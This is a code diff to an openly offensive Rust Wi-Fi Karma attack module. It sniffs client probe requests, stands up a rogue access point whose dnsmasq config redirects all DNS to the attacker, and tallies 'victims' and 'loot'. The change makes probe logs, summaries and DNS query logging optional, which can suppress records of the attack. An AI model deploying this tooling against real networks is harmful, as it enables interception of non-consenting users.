@@ -350,13 +350,18 @@ impl KarmaAttack {
                 probes.iter().map(|p| p.ssid.clone()).collect();
             ssids.into_iter().collect()
         };
+        let log_file = if crate::logs_enabled() {
+            self.config.output_dir.join("karma_log.txt")
+        } else {
+            PathBuf::new()
+        };
 
         KarmaResult {
             stats: self.get_stats(),
             probes,
             victims,
             ssids_seen,
-            log_file: self.config.output_dir.join("karma_log.txt"),
+            log_file,
         }
     }
 
@@ -405,6 +410,12 @@ pub fn execute_karma<F>(
 where
     F: Fn(&str) + Send + Sync + 'static,
 {
+    let mut config = config;
+    let logging_enabled = crate::logs_enabled();
+    if !logging_enabled {
+        config.log_probes = false;
+    }
+
     // Create loot directory
     let base = loot_base.unwrap_or("loot/Wireless/karma");
     let timestamp = Local::now().format("%Y%m%d_%H%M%S").to_string();
@@ -419,21 +430,30 @@ where
     let attack = Arc::new(KarmaAttack::new(config.clone()));
     attack.running.store(true, Ordering::SeqCst);
 
-    // Create log files
-    let probe_log_path = loot_dir.join("probes.log");
-    let summary_path = loot_dir.join("summary.txt");
+    // Create log files when allowed
+    let log_to_file = logging_enabled && config.log_probes;
+    let (probe_log_path, probe_log) = if log_to_file {
+        let path = loot_dir.join("probes.log");
+        let mut file = fs::File::create(&path)
+            .map_err(|e| WirelessError::System(format!("Failed to create probe log: {}", e)))?;
 
-    let mut probe_log = fs::File::create(&probe_log_path)
-        .map_err(|e| WirelessError::System(format!("Failed to create probe log: {}", e)))?;
-
-    writeln!(probe_log, "# Karma Attack Probe Log").ok();
-    writeln!(
-        probe_log,
-        "# Started: {}",
-        Local::now().format("%Y-%m-%d %H:%M:%S")
-    )
-    .ok();
-    writeln!(probe_log, "# Format: timestamp,client_mac,ssid,signal_dbm").ok();
+        writeln!(file, "# Karma Attack Probe Log").ok();
+        writeln!(
+            file,
+            "# Started: {}",
+            Local::now().format("%Y-%m-%d %H:%M:%S")
+        )
+        .ok();
+        writeln!(file, "# Format: timestamp,client_mac,ssid,signal_dbm").ok();
+        (path, Some(Arc::new(Mutex::new(file))))
+    } else {
+        (PathBuf::new(), None)
+    };
+    let summary_path = if logging_enabled {
+        Some(loot_dir.join("summary.txt"))
+    } else {
+        None
+    };
 
     // Setup interface for monitor mode
     let mut interface = WirelessInterface::new(&config.interface)?;
@@ -462,7 +482,6 @@ where
     let probe_sniffer = ProbeSniffer::from_name(&config.interface)?;
 
     let attack_clone = Arc::clone(&attack);
-    let probe_log = Arc::new(Mutex::new(probe_log));
     let progress = Arc::new(progress);
     let start = Instant::now();
     let duration = Duration::from_secs(config.duration as u64);
@@ -502,16 +521,18 @@ where
                     attack_clone.handle_probe(&probe.client_mac.to_string(), ssid, signal.into());
 
                     // Log to file
-                    if let Ok(mut log) = probe_log.lock() {
-                        writeln!(
-                            log,
-                            "{},{},{},{}",
-                            Local::now().format("%H:%M:%S"),
-                            probe.client_mac,
-                            ssid,
-                            signal
-                        )
-                        .ok();
+                    if let Some(log_handle) = probe_log.as_ref() {
+                        if let Ok(mut log) = log_handle.lock() {
+                            writeln!(
+                                log,
+                                "{},{},{},{}",
+                                Local::now().format("%H:%M:%S"),
+                                probe.client_mac,
+                                ssid,
+                                signal
+                            )
+                            .ok();
+                        }
                     }
 
                     // Progress update for new SSIDs
@@ -535,29 +556,31 @@ where
     let mut result = attack.get_result();
     result.log_file = probe_log_path.clone();
 
-    // Write summary
-    let mut summary = fs::File::create(&summary_path)
-        .map_err(|e| WirelessError::System(format!("Failed to create summary: {}", e)))?;
+    // Write summary if logging is enabled
+    if let Some(summary_path) = summary_path.as_ref() {
+        let mut summary = fs::File::create(summary_path)
+            .map_err(|e| WirelessError::System(format!("Failed to create summary: {}", e)))?;
 
-    writeln!(summary, "Karma Attack Summary").ok();
-    writeln!(
-        summary,
-        "Completed: {}",
-        Local::now().format("%Y-%m-%d %H:%M:%S")
-    )
-    .ok();
-    writeln!(summary, "Duration: {:?}", start.elapsed()).ok();
-    writeln!(summary, "").ok();
-    writeln!(summary, "Statistics:").ok();
-    writeln!(summary, "  Probes seen: {}", result.stats.probes_seen).ok();
-    writeln!(summary, "  Unique SSIDs: {}", result.stats.unique_ssids).ok();
-    writeln!(summary, "  Unique clients: {}", result.stats.unique_clients).ok();
-    writeln!(summary, "  Victims: {}", result.stats.victims).ok();
-    writeln!(summary, "").ok();
-    writeln!(summary, "SSIDs discovered:").ok();
-    for ssid in &result.ssids_seen {
-        if !ssid.is_empty() {
-            writeln!(summary, "  - {}", ssid).ok();
+        writeln!(summary, "Karma Attack Summary").ok();
+        writeln!(
+            summary,
+            "Completed: {}",
+            Local::now().format("%Y-%m-%d %H:%M:%S")
+        )
+        .ok();
+        writeln!(summary, "Duration: {:?}", start.elapsed()).ok();
+        writeln!(summary, "").ok();
+        writeln!(summary, "Statistics:").ok();
+        writeln!(summary, "  Probes seen: {}", result.stats.probes_seen).ok();
+        writeln!(summary, "  Unique SSIDs: {}", result.stats.unique_ssids).ok();
+        writeln!(summary, "  Unique clients: {}", result.stats.unique_clients).ok();
+        writeln!(summary, "  Victims: {}", result.stats.victims).ok();
+        writeln!(summary, "").ok();
+        writeln!(summary, "SSIDs discovered:").ok();
+        for ssid in &result.ssids_seen {
+            if !ssid.is_empty() {
+                writeln!(summary, "  - {}", ssid).ok();
+            }
         }
     }
 
@@ -601,6 +624,12 @@ pub fn execute_karma_with_ap<F>(
 where
     F: Fn(&str) + Send + Sync + 'static,
 {
+    let mut config = config;
+    let logging_enabled = crate::logs_enabled();
+    if !logging_enabled {
+        config.log_probes = false;
+    }
+
     let base = loot_base.unwrap_or("loot/Wireless/karma");
     let timestamp = Local::now().format("%Y%m%d_%H%M%S").to_string();
     let loot_dir = PathBuf::from(base).join(&timestamp);
@@ -679,18 +708,23 @@ where
 
     // Start dnsmasq for DHCP
     let dnsmasq_conf_path = loot_dir.join("dnsmasq.conf");
+    let dnsmasq_logging = if logging_enabled {
+        "        log-queries\n        log-dhcp\n"
+    } else {
+        ""
+    };
     let dnsmasq_config = format!(
         "interface={}\n\
         dhcp-range=192.168.4.10,192.168.4.100,255.255.255.0,12h\n\
         dhcp-option=3,192.168.4.1\n\
         dhcp-option=6,192.168.4.1\n\
         server=8.8.8.8\n\
-        log-queries\n\
-        log-dhcp\n\
+{dnsmasq_logging}\
         listen-address=192.168.4.1\n\
         bind-interfaces\n\
         address=/#/192.168.4.1\n",
-        ap_interface
+        ap_interface,
+        dnsmasq_logging = dnsmasq_logging
     );
 
     fs::write(&dnsmasq_conf_path, &dnsmasq_config)
@@ -756,14 +790,16 @@ where
 
     let result = attack.get_result();
 
-    // Write summary
-    let summary_path = loot_dir.join("summary.txt");
-    let mut summary = fs::File::create(&summary_path)?;
+    // Write summary if logging is enabled
+    if logging_enabled {
+        let summary_path = loot_dir.join("summary.txt");
+        let mut summary = fs::File::create(&summary_path)?;
 
-    writeln!(summary, "Karma AP Attack Summary").ok();
-    writeln!(summary, "Primary SSID: {}", primary_ssid).ok();
-    writeln!(summary, "Duration: {:?}", start.elapsed()).ok();
-    writeln!(summary, "Victims: {}", result.stats.victims).ok();
+        writeln!(summary, "Karma AP Attack Summary").ok();
+        writeln!(summary, "Primary SSID: {}", primary_ssid).ok();
+        writeln!(summary, "Duration: {:?}", start.elapsed()).ok();
+        writeln!(summary, "Victims: {}", result.stats.victims).ok();
+    }
 
     progress(&format!("Karma AP complete: {} victims", result.stats.victims));
 
